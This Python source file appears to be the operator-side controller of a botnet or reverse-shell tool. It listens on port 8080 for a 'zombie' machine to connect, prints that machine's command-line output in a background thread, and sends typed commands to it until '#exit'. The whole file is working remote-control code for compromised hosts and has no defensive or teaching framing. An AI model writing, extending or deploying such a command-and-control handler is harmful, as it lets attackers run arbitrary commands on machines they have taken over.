"""
    Main code
    Handles startup, main control loop, calls to other functions, etc
"""
from time import sleep
import threading
# import my own code
import utils


"""
    Class to output data from the zombie command line to the screen
    This runs as its own thread to not block anything else and better handle fragmented and continuous output
"""
class cmdOutputThread (threading.Thread):
    def __init__(self, sock):
        threading.Thread.__init__(self, daemon=True)
        self.sock = sock

    def run(self):
        global currDir

        while not self.sock.closed():
            data = ''
            try:
                data = self.sock.recv(4096)
                print(str(data, 'UTF-8'))
            except Exception as inst:
                print(type(inst))
                print(inst.args)
                print(inst)
                sleep(10)

"""
    Main function, 
"""
def main():
    # wait for a zombie to connect
    cmdSock = utils.openConnection(8080)

    # start a thread to print the command line output
    cmdThread = cmdOutputThread(cmdSock)
    cmdThread.start()

    #main command loop
    cmd = input('')
    while cmd != '#exit':
        cmdSock.sendall(cmd.encode('UTF-8') + b'\n\0')
        cmd = input('')

    # send the exit command and close the command socket
    cmdSock.sendall(cmd.encode('UTF-8') + b'\n\0')
    cmdSock.close()

if __name__ == "__main__":
    main()